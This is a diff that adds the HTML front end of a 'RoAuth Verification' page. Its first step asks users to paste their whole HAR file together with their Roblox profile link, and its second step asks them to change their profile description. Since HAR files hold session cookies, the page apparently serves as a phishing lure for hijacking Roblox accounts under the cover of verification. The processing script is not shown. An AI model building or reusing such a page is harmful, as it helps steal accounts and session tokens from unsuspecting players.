@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RoAuth Verification</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <h1 id="title">RoAuth Verification</h1>
+        <div id="step1">
+            <h2>Step 1: Paste HAR File</h2>
+            <textarea id="harFile" placeholder="Paste your HAR file content here"></textarea>
+            <input id="robloxProfile" placeholder="Enter your Roblox profile link">
+            <button onclick="step1Submit()">Submit Step 1</button>
+        </div>
+        <div id="step2" style="display: none;">
+            <h2>Step 2: Update Your Roblox Description</h2>
+            <p id="generatedSentence"></p>
+            <button onclick="step2Verify()">Verify Me!</button>
+        </div>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
